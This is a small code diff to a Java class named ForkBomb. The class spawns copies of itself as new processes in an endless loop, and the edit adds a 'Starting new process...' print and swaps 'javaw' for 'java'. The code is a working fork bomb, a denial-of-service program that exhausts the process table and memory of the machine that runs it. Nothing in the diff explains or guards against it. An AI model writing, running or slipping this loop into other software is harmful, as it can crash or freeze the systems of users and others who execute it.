@@ -9,7 +9,8 @@ public class ForkBomb
     while(true)
     {
       try {
-		Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+    	 System.out.println("Starting new process..."); 
+		 Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
 	} catch (IOException e) {
 		// TODO Auto-generated catch block
 		e.printStackTrace();
